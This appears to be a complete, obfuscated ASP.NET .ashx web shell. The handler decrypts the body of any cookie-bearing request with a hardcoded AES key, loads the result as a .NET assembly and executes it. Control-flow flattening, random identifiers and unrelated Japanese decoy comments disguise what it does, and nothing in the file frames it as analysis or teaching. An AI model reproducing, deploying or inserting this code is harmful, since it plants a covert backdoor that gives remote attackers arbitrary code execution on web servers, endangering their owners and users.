<%@ WebHandler Language="C#" Class="P_a1b2" %>
using System.Web;using System.Text;
// 月が綺麗ですね
public class P_a1b2:IHttpHandler{
    public void ProcessRequest(HttpContext c_c3d4){
        int s_e5f6 = 0;
        while(s_e5f6 != -1) {
            switch(s_e5f6) {
                case 0:
                    // これは何ですか
                    if(c_c3d4.Request.Cookies.Count > 0) s_e5f6 = 1;
                    else s_e5f6 = -1;
                    break;
                case 1:
                    // 昨日の晩ご飯はカレーでした
                    var k_g7h8 = Encoding.Default.GetBytes(new char[]{'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'});
                    var d_i9j0 = c_c3d4.Request.BinaryRead(c_c3d4.Request.ContentLength);
                    var r_k1l2 = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k_g7h8, k_g7h8);
                    var p_m3n4 = r_k1l2.TransformFinalBlock(d_i9j0, 0, d_i9j0.Length);
                    var a_o5p6 = System.Reflection.Assembly.Load(p_m3n4);
                    a_o5p6.CreateInstance("K").Equals(c_c3d4);
                    s_e5f6 = -1; // プログラムの終了
                    break;
            }
        }
    }
    // 猫はかわいいです
    public bool IsReusable{get{return false;}}
}